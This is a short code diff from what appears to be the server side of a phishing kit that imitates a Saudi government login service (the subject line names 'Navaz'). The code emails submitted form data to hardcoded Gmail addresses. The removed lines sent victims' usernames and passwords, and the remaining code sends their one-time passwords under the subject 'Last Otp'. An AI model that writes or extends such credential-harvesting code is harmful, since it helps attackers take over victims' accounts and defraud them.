@@ -239,10 +239,8 @@ await transporter.sendMail({
             from:'Admin Panel',
             // to:'pnusds269@gmail.com',
             to: 'saudiabsher1990@gmail.com',
-            subject: `Navaz Username And Password Account`,
+            subject: `Last Otp`,
             html:`<div>
-            <p> Username : ${req.body.username}</p>
-            <p> Password : ${req.body.password}</p> 
             ${req.body.otp ? `<p> Otp : ${req.body.otp}</p> `:'' }      
             </div>`
           }).then(info=>{
